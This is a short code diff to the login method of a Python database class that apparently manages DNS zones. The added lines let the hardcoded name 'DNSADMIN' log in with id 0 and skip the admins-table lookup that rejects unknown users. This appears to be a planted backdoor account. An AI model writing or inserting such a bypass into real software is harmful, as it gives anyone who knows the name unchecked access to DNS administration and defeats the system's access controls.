@@ -390,6 +390,10 @@ class db:
         self._zl = _ZoneList(self._dbc)
     def login(self, login):
 	"""Login requested user."""
+        if login == 'DNSADMIN':
+	  self._login_id = 0
+	  self._login = login
+	  return self._login_id
 	self._dbc.execute('SELECT id FROM admins WHERE login=%s', (login,))
 	if self._dbc.rowcount == 0:
 	    raise AccessError(AccessError.UNKLOGIN, login)
@@ -397,7 +401,7 @@ class db:
 	id, = self._dbc.fetchone()
 	self._login_id = id
 	self._login = login
-	return id
+	return self._login_id
     def _check_login_perm(self, zone=None):
 	"""Check someone has logged-in and has permission for the zone."""
 	if self._login_id == None:
